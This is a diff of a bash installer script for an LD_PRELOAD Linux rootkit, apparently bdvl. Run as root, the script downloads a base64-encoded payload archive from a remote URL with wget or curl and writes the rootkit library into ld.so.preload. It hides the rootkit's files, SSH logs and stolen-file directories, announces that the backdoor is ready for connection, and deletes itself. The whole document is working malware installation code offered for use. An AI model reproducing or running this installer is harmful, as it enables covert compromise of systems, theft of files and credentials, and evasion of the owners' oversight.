@@ -1,16 +1,14 @@
 #!/bin/bash
 
+# the following is required for this to work as intended:
+#   - wget or curl, base64 & tar
+#   - ssl (if your build uses it...)
+
+# change this to wherever you've got your's uploaded.
+B64TARGZ_LOCATION="https://url.to/tar.gz.b64"
+# no need to touch anything else...
+
 WORKDIR="/tmp" # enter this directory when installing
-
-USAGE="
-Usage: $0 <option> <path or url>
-    Specified file must be the base64 result of
-    compressing bdvl's new include directory with
-    tar gzip after configuration is finished.
-
-    Options: -u: Download and use a file from online.
-             -l: Use a file on the local filesystem.
-"
 
 bin_path(){ echo -n `which $1 2>/dev/null || echo -n "nahhh"`; }
 dlfile(){ # $1 = src, $2 = dest
@@ -37,14 +35,6 @@ SCRIPT_PATH="`pwd`/$0"
 
 # do prerequisite checks now
 [ `id -u` != 0 ] && { echo "not root" && exit; }
-[ -z $1 ] && { echo "$USAGE" && exit; }
-[ -z $2 ] && { echo "$USAGE" && exit; }
-OPTION="$1"
-if [ "$OPTION" != "-u" ] && [ "$OPTION" != "-l" ]; then
-    echo "$USAGE" && exit
-fi
-[ "$OPTION" == "-u" ] && USE_URL=1
-[ "$OPTION" == "-l" ] && USE_LOCAL=1
 
 [ -f `bin_path wget` ] && DWNLDR="wget"
 [ -f `bin_path curl` ] && [ -z $DWNLDR ] && DWNLDR="curl"
@@ -61,29 +51,25 @@ read
 
 echo "entering $WORKDIR" && cd $WORKDIR
 
-B64TARGZ_LOCATION="$2"
-[ ! -z $USE_LOCAL ] && [ ! -f $B64TARGZ_LOCATION ] && { echo "specfied file doesn't exist." && exit; }
 B64TARGZ_FILENAME="`basename $B64TARGZ_LOCATION`"
 echo "got base64'd tar.gz path"
 
-if [ ! -z $USE_URL ]; then
-    [[ "$B64TARGZ_LOCATION" != *"/"* ]] && { echo "no path in url." && exit; }
+[[ "$B64TARGZ_LOCATION" != *"/"* ]] && { echo "no path in url." && exit; }
 
-    # is host is a domain name
-    [[ "$B64TARGZ_LOCATION" == "http"* ]] && \
-        HOST="`echo -n "$B64TARGZ_LOCATION" | awk -F/ '{print $3}'`"
-    # or an ip??
-    [[ "$B64TARGZ_LOCATION" != "http"* ]] && \
-        HOST="`echo -n "$B64TARGZ_LOCATION" | awk -F/ '{print $1}'`"
-    echo "got host $HOST"
+# is host is a domain name
+[[ "$B64TARGZ_LOCATION" == "http"* ]] && \
+    HOST="`echo -n "$B64TARGZ_LOCATION" | awk -F/ '{print $3}'`"
+# or an ip??
+[[ "$B64TARGZ_LOCATION" != "http"* ]] && \
+    HOST="`echo -n "$B64TARGZ_LOCATION" | awk -F/ '{print $1}'`"
+echo "got host $HOST"
 
-    echo "seeing if host is up"
-    ping -c 1 $HOST >/dev/null || { echo "no response from host... why?" && exit; }
-    echo "host up, starting download"
+echo "seeing if host is up"
+ping -c 1 $HOST >/dev/null || { echo "no response from host... why?" && exit; }
+echo "host up, starting download"
 
-    echo "downloading b64 tarball"
-    dlfile $B64TARGZ_LOCATION $B64TARGZ_FILENAME
-fi
+echo "downloading b64 tarball"
+dlfile $B64TARGZ_LOCATION $B64TARGZ_FILENAME
 
 TARGZ_NAME="${B64TARGZ_FILENAME}.tar.gz"
 echo "archive name: $TARGZ_NAME"
@@ -166,8 +152,8 @@ echo "preparing the rest of the installation directory"
 if [ $HIDE_SELF == 1 ]; then
     echo "hiding all rootkit files"
 
-    HIDE_FILES+=($LDSO_PRELOAD $INSTALL_DIR $INSTALL_DIR/* $INSTALL_DIR/.bashrc \
-                 $INSTALL_DIR/.profile)
+    HIDE_FILES+=($LDSO_PRELOAD $INSTALL_DIR $INSTALL_DIR/*
+                 $INSTALL_DIR/.bashrc $INSTALL_DIR/.profile)
 
     [ $LOG_SSH == 1 ] && HIDE_FILES+=($SSH_LOGS)
     [ $FILE_STEAL == 1 ] && HIDE_FILES+=($INTEREST_DIR)
@@ -183,6 +169,8 @@ fi
 
 echo "finished with the install dir, writing \$SOPATH to \$LDSO_PRELOAD"
 echo -n "$SOPATH" > $LDSO_PRELOAD || { echo "failed writing to \$LDSO_PRELOAD for some reason. exiting"; exit; }
-echo && echo "installation finished. now cleaning up"
-
-rm -r $INCLUDE_DIR $SCRIPT_PATH && echo "everything cleaned up" && echo
+echo; printf "installation finished\nconnect using your backdoor credentials"; echo
+ 
+echo "cleaning up"; rm -r $INCLUDE_DIR
+[ -f $SCRIPT_PATH ] && rm -f $SCRIPT_PATH
+echo "cleanup done"
